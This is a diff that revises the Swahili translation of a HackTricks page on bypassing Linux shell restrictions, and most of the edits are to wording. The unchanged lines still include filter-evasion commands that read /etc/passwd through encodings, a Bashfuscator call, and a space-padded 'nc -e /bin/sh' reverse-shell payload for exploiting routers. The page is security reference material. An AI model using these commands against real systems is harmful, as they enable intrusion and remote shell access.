@@ -4,7 +4,7 @@
 
 ## Mbinu za Kupita Vizuizi vya Kawaida
 
-Mikusanyo ya command-injection na WAF-evasion katika PayloadsAllTheThings, cheat sheet ya Bo0oM, na makala mbili za Secjuice zilizounganishwa hutoa msingi wa tofauti za shell-syntax katika sehemu hii.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
+Mikusanyo ya command-injection na WAF-evasion katika PayloadsAllTheThings, cheat sheet ya Bo0oM, pamoja na makala mbili zilizounganishwa za Secjuice, hutoa msingi kuhusu variations za shell-syntax katika sehemu hii.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)</sup>
 
 ### Reverse Shell
 ```bash
@@ -107,16 +107,16 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Bypass ya backslash na slash
+### Bypass backslash na slash
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Bypass pipes
+### Kukwepa pipes
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Bypass kwa kutumia hex encoding
+### Bypass kwa kutumia usimbaji wa hex
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -126,7 +126,7 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### Bypass IPs
+### Kukwepa IP
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
@@ -142,12 +142,12 @@ echo ${PATH:0:1} #/
 ```
 ### DNS data exfiltration
 
-Kwa out-of-band callbacks, huduma ya mtindo wa collaborator kama Burp Collaborator inaweza kufanya target application iwasiliane na external server; kiungo cha [**pingb**](http://pingb.in) kilichopo kimehifadhiwa kama navigation ya kihistoria, si dai la upatikanaji wa sasa.<sup>[[6]](#references)</sup>
+Kwa callbacks za out-of-band, service ya aina ya collaborator kama Burp Collaborator inaweza kushawishi target application kuwasiliana na server ya nje; link iliyopo ya [**pingb**](http://pingb.in) imehifadhiwa kama navigation ya kihistoria, si dai la upatikanaji wa sasa.<sup>[[6]](#references)</sup>
 
 ### Builtins
 
-Katika restricted shell, builtins zinazopatikana ndizo command surface iliyosalia kwa mifano hii; Bash inaandika kuhusu builtin commands zake na execution grammar.<sup>[[7]](#references)</sup> Wazo limetoka kwa [**devploit**](https://twitter.com/devploit).\
-Anza na navigation ya [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html) iliyopo, kisha jaribu techniques zifuatazo mahususi kwa Bash:<sup>[[7]](#references)</sup>
+Katika restricted shell, builtins zinazopatikana ndizo command surface iliyobaki kwa mifano hii; Bash inaeleza builtin commands zake na execution grammar.<sup>[[7]](#references)</sup> Wazo limetoka kwa [**devploit**](https://twitter.com/devploit).\
+Anza na navigation iliyopo ya [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html), kisha jaribu techniques zifuatazo mahususi kwa Bash:<sup>[[7]](#references)</sup>
 ```bash
 # Get list of builtins
 declare builtins
@@ -211,14 +211,14 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 ```
 ### Bashfuscator
 
-Amri ifuatayo hutumia Bashfuscator, mfumo wa open-source wa kuficha msimbo wa Bash; kiungo cha repository kwenye maoni ya msimbo kimehifadhiwa kwa ajili ya urambazaji.<sup>[[8]](#references)</sup>
+Mwito ufuatao unatumia Bashfuscator, framework ya open-source ya Bash obfuscation; kiungo cha repository kwenye maoni ya code kimehifadhiwa kwa ajili ya navigation.<sup>[[8]](#references)</sup>
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
 ./bashfuscator -c 'cat /etc/passwd'
 ```
-### RCE kwa herufi 5
+### RCE yenye herufi 5
 
-Mifano miwili ya kihistoria yenye herufi 5 ifuatayo imehifadhiwa kama reproductions za challenge: repository kuu ya challenge inapatikana kwenye [repository ya Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges), huku link ya pili ya write-up iliyo kwenye code block ikiwa ni ya navigation ambayo upatikanaji wake wa sasa haujathibitishwa.<sup>[[9]](#references)</sup>
+Mifano miwili ya kihistoria yenye herufi 5 ifuatayo imehifadhiwa kama reproductions za challenge: repository kuu ya challenge inapatikana kwenye [repository ya Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges), huku linki ya pili ya write-up katika code block ikiwa ya urambazaji, na upatikanaji wake wa sasa haukuthibitishwa.<sup>[[9]](#references)</sup>
 ```bash
 # From the Orange Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
 #Orange Tsai solution
@@ -302,7 +302,7 @@ ln /f*
 ```
 ## Read-Only/Noexec/Distroless Bypass
 
-Ikiwa uko ndani ya filesystem yenye ulinzi wa **read-only na noexec**, au katika **distroless image**, mazingira hayo yanaweka vikwazo vya utekelezaji vilivyoandikwa katika Linux `mount(8)` na mradi wa Distroless; ukurasa uliounganishwa unakusanya mbinu za kufanya kazi ndani ya vikwazo hivyo.<sup>[[11]](#references)[[12]](#references)</sup>
+Ikiwa uko ndani ya filesystem yenye **read-only na noexec protections**, au katika **distroless image**, mazingira yanaweka vikwazo vya utekelezaji vilivyoandikwa na Linux `mount(8)` na mradi wa Distroless; ukurasa uliounganishwa unakusanya mbinu za kufanya kazi ndani ya vikwazo hivyo.<sup>[[11]](#references)[[12]](#references)</sup>
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
@@ -316,36 +316,36 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-Wakati vulnerability inakuruhusu kudhibiti kwa sehemu argument ambayo hatimaye inafikia `system()` au shell nyingine, offset ya payload inaweza kuwa haijulikani. Alan Cao na Will Tan wanaeleza hali ya kifaa kilichopachikwa chenye vikwazo, ambapo shell payload ilisambazwa kwenye NVRAM iliyopangiliwa kwenye memory na kuwekewa spaces mwanzoni.<sup>[[5]](#references)</sup>
+Wakati vulnerability inakuruhusu kudhibiti kwa sehemu argument ambayo hatimaye inafikia `system()` au shell nyingine, payload offset inaweza kutokuwa na uhakika. Alan Cao na Will Tan wanaeleza hali ya kifaa chenye rasilimali finyu ambapo shell payload ilisambazwa kwenye NVRAM iliyokuwa memory-mapped na kutanguliwa na spaces.<sup>[[5]](#references)</sup>
 
-Kwa hiyo unaweza kuunda *NOP sled for Bash* kwa kuweka command yako halisi baada ya mfululizo mrefu wa spaces au tab characters; Bash hufafanua spaces na tabs kama blanks zinazotenganisha maneno katika simple command.<sup>[[5]](#references)[[7]](#references)</sup>
+Kwa hivyo unaweza kuunda *NOP sled for Bash* kwa kutanguliza command yako halisi kwa mfululizo mrefu wa spaces au tab characters; Bash hufafanua spaces na tabs kama blanks zinazotenganisha maneno katika simple command.<sup>[[5]](#references)[[7]](#references)</sup>
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-Ikiwa ROP chain (au memory-corruption primitive nyingine) itapitisha pointer ya command-string inayoanza popote ndani ya space block, Bash inaweza kuchanganua nafasi zilizo mwanzoni hadi ifikie command; katika exploit ya d router, hii ilifanya string offsets zisizo na uhakika zitumike.<sup>[[5]](#references)[[7]](#references)</sup>
+Ikiwa ROP chain (au primitive nyingine ya memory-corruption) itapitisha command-string pointer inayoanza mahali popote ndani ya space block, Bash inaweza kuchanganua leading blanks zilizobaki hadi ifikie command; katika router exploit iliyotajwa, hii ilifanya string offsets zisizo na uhakika zitumike.<sup>[[5]](#references)[[7]](#references)</sup>
 
-Matumizi ya kiutendaji katika embedded targets zenye vikwazo ni pamoja na:<sup>[[5]](#references)</sup>
+Matumizi ya vitendo katika embedded targets zenye vikwazo yanajumuisha:<sup>[[5]](#references)</sup>
 
-1. **Memory-mapped configuration blobs** (kwa mfano NVRAM) zinazoweza kufikiwa na processes mbalimbali.<sup>[[5]](#references)</sup>
-2. Payload channels ambapo attacker hawezi kuandika NULL bytes ili kupanga payload (marekebisho ya jumla ya alignment problem).<sup>[[5]](#references)</sup>
-3. Embedded devices zenye mazingira madogo ya BusyBox `ash`/`sh`, ambayo BusyBox huyatambulisha kama applets katika mifumo yenye rasilimali chache.<sup>[[10]](#references)</sup>
+1. **Memory-mapped configuration blobs** (k.m. NVRAM) zinazoweza kufikiwa na processes mbalimbali.<sup>[[5]](#references)</sup>
+2. Payload channels ambapo attacker hawezi kuandika NULL bytes ili ku-align payload (marekebisho ya jumla ya alignment problem).<sup>[[5]](#references)</sup>
+3. Embedded devices zenye mazingira madogo ya BusyBox `ash`/`sh`, ambayo BusyBox inayaandika kama applets katika resource-constrained systems.<sup>[[10]](#references)</sup>
 
-> 🛠️  Unganisha mbinu hii na ROP gadgets zinazoita `system()` katika controlled lab; utafiti wa d router unaonyesha mchanganyiko huu kwenye hardware yenye vikwazo.<sup>[[5]](#references)</sup>
+> 🛠️  Unganisha technique hii na ROP gadgets zinazoita `system()` katika controlled lab; router research iliyotajwa inaonyesha mchanganyiko huu kwenye constrained hardware.<sup>[[5]](#references)</sup>
 
 ## References
 
 - [1] [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [2] [Bo0oM - WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
-- [3] [Mbinu za Kukwepa Web Application Firewall (WAF) #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [4] [Mbinu za Kukwepa Web Application Firewall (WAF) #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
-- [5] [Alan Cao and Will Tan — Kutumia zero days katika hardware iliyoachwa — blogu ya Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [3] [Web Application Firewall (WAF) Evasion Techniques #2 - theMiddle](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
+- [4] [Web Application Firewall (WAF) Evasion Techniques #3 - theMiddle](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+- [5] [Alan Cao and Will Tan — Kutumia zero days katika abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 - [6] [Burp Collaborator - PortSwigger](https://portswigger.net/burp/documentation/desktop/tools/collaborator)
-- [7] [bash(1) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man1/bash.1.html)
+- [7] [bash(1) — Linux manual page](https://man7.org/linux/man-pages/man1/bash.1.html)
 - [8] [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
 - [9] [My-CTF-Web-Challenges — Orange Tsai](https://github.com/orangetw/My-CTF-Web-Challenges)
 - [10] [BusyBox](https://busybox.net/downloads/BusyBox.html)
-- [11] [mount(8) — ukurasa wa mwongozo wa Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
+- [11] [mount(8) — Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
 - [12] [Distroless](https://github.com/GoogleContainerTools/distroless)
 {{#include ../../../banners/hacktricks-training.md}}
